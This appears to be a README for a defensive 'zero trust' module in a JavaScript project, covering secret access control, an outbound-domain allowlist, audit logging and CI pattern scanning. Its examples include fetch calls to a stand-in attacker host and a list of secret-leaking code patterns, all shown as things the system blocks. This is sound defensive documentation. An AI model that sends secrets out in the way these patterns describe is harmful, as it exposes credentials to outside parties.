# ZeroLeak Zero Trust Mode

## 🛡️ Principles

- 🔒 Secrets are never freely accessible
- 👁️ Every sensitive action is logged
- 🚫 Outbound traffic is restricted
- ⚖️ High-risk changes require extra approval

---

## 🔧 Components

### 1. Secret Access Control (`security/secret-manager.js`)

Controls who can access secrets and logs all access attempts.

**Allowed Callers:**
```javascript
const ALLOWED_CALLERS = [
  "services/slack.js",
  "services/ai.js",
  "services/firebase.js",
  "lib/firebase.ts",
  "lib/ai/",
  "app/api/"
];
```

**Usage:**
```javascript
const { getSecret } = require("../security/secret-manager");

// This will throw if caller is not allowed
const webhook = getSecret("SLACK_WEBHOOK_URL");
```

**Features:**
- Access control based on caller location
- Audit logging for all access attempts
- Unauthorized access attempts are logged and blocked

### 2. Network Guard (`security/network-guard.js`)

Intercepts and blocks unauthorized outbound requests.

**Allowed Domains:**
```javascript
const ALLOWED_DOMAINS = [
  "hooks.slack.com",
  "api.openai.com",
  "api.groq.com",
  "api.anthropic.com",
  "slack.com",
  "firebaseio.com",
  "firebaseapp.com",
  "firebasestorage.app",
  "github.com",
  "api.github.com",
  "vercel.com",
  "vercel.app",
  "generativelanguage.googleapis.com"
];
```

**Usage:**
```javascript
// Initialize at app start
require("./security/network-guard");

// All fetch calls are now intercepted
fetch("https://api.openai.com/v1/chat/completions"); // Allowed
fetch("https://attacker.com/log"); // BLOCKED
```

**Features:**
- Intercepts global fetch
- Blocks requests to unauthorized domains
- Audit logging for all outbound requests

### 3. Audit Log (`security/audit-log.js`)

Centralized logging for all security events.

**Usage:**
```javascript
const { log, logSecretAccess, logNetworkRequest, logViolation } = require("../security/audit-log");

// Log generic event
log("CUSTOM_EVENT", { details: "..." });

// Log secret access
logSecretAccess("SLACK_WEBHOOK_URL", caller, authorized);

// Log network request
logNetworkRequest(url, caller, allowed);

// Log security violation
logViolation("UNAUTHORIZED_ACCESS", { details: "..." });
```

**Features:**
- Centralized logging for all security events
- Writes to `security.log`
- Timestamped entries with full context

### 4. Forbidden Patterns

The scanner now hard-blocks dangerous patterns:

- `console.log(process.env.X)` - Forbidden
- `fetch(process.env.X)` - Forbidden
- `axios.post(process.env.X)` - Forbidden

These patterns are detected and blocked in CI.

---

## 🚀 Deployment

### 1. Initialize Network Guard

Add to your app entry point (e.g., `app/layout.tsx` or `pages/_app.tsx`):

```typescript
if (typeof window === "undefined") {
  require("../security/network-guard");
}
```

### 2. Replace Direct Env Access

**Before:**
```javascript
const webhook = process.env.SLACK_WEBHOOK_URL;
```

**After:**
```javascript
const { getSecret } = require("../security/secret-manager");
const webhook = getSecret("SLACK_WEBHOOK_URL");
```

### 3. Update Allowed Callers

If you need to add a new file to the allowed callers list:

```javascript
const { addAllowedCaller } = require("../security/secret-manager");
addAllowedCaller("services/new-service.js");
```

### 4. Update Allowed Domains

If you need to add a new domain to the allowlist:

```javascript
const { addAllowedDomain } = require("../security/network-guard");
addAllowedDomain("api.new-service.com");
```

---

## 🧪 Testing

### Manual Testing

```bash
# Test secret access control
node -e "const { getSecret } = require('./security/secret-manager'); console.log(getSecret('SLACK_WEBHOOK_URL'));"

# Test network guard
node -e "require('./security/network-guard'); fetch('https://attacker.com/log');"

# Test scanner
node security/scan-secrets.js
node security/appsec-scan.js
```

### Expected Results

- Secret access from unauthorized files → BLOCKED
- Outbound requests to unauthorized domains → BLOCKED
- Forbidden patterns in code → BLOCKED in CI

---

## 📊 Audit Trail

All security events are logged to `security.log`:

```
2024-04-18T01:00:00.000Z | GRANTED | SLACK_WEBHOOK_URL | services/slack.js
2024-04-18T01:00:01.000Z | ALLOWED | https://api.openai.com/v1/chat/completions | app/api/ai/route.ts
2024-04-18T01:00:02.000Z | DENIED | API_KEY | unknown-file.js
2024-04-18T01:00:03.000Z | BLOCKED | https://attacker.com/log | malicious-file.js
```

---

## ⚠️ Configuration

### Environment Isolation

On Vercel, ensure:
- Production secrets → only prod
- Preview → separate secrets
- Dev → separate secrets

No cross-environment leakage.

### High-Risk PR Detection

PRs that include:
- `security/` directory
- `.github/workflows/` directory
- `process.env` usage

Should be labeled `HIGH-RISK` and require 2 reviewers.

---

## 🧠 Security Maturity

| Level | Capability | Status |
|-------|------------|--------|
| Level 1: Prevent accidental leaks | Pattern-based detection | ✅ Complete |
| Level 2: Resist basic attackers | Evasion technique hardening | ✅ Complete |
| Level 3: Defend against real attacks | AppSec heuristic detection | ✅ Complete |
| Level 4: Zero Trust architecture | Access control + audit trail | ✅ Complete |

---

## 🚫 What Cannot Be Prevented

The system cannot prevent:
- Approving malicious PRs
- Whitelisting bad domains
- Reusing compromised secrets

**Mitigation:** Code review + audit logs + regular security reviews.

---

**ZeroLeak Zero Trust Mode - Defense in Depth Architecture**
